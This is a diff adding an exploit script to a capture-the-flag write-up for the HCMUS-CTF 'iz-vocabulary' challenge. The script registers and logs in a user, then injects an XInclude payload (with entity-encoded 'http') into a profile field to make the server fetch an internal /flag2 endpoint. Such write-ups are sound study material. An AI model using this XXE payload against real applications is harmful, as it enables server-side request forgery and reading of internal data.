@@ -119,3 +119,61 @@ Now we can access the `admin` account and go to the `/debug` endpoint of the API
 To call the endpoint `/flag2`, we use XXE similar to how we read the file on the server with payload `<xi:include xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)" href="[http://iz-vocabulary-api:8080/flag2](http://iz-vocabulary-api:8080/flag2)" parse="text"></xi:include>` and get the flag.
 
 ![Untitled](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%209.png)
+
+# Exploit code
+
+```python
+import requests
+import secrets
+import time
+import re
+
+URL = 'http://127.0.0.1:8000'
+
+s = requests.Session()
+
+def random_user():
+    return {
+        'username': secrets.token_hex(5),
+        'password': secrets.token_hex(50),
+        'email': 'haha',
+        'phone': 'hihi',
+    }
+
+def register(user):
+    time.sleep(1)
+    s.post(URL + '/register.php', data={
+        'username': user['username'],
+        'password': user['password'],
+        'email': user['email'],
+        'phone': user['phone'],
+    })
+
+def login(user):
+    time.sleep(1)
+    s.post(URL + '/login.php', data={
+        'username': user['username'],
+        'password': user['password'],
+    })
+
+def get_flag():
+    resp = s.post(URL + '/setting.php', data={
+        'email': '<xi:include xmlns:xi="&#104;ttp://www.w3.org/2001/XInclude" href="&#104;ttp://iz-vocabulary-api:8080/flag2" parse="text"></xi:include>',
+        'phone': 'hehe'
+    }).text
+    re_res = re.findall(r'HCMUS-CTF{(.*)}', resp)
+    if len(re_res) > 0:
+        for flag in re_res:
+            print("[+] flag: HCMUS-CTF{" + flag + "}")
+
+user = random_user()
+
+print('[+] register user')
+register(user)
+
+print('[+] login')
+login(user)
+
+print('[+] get flag')
+get_flag()
+```
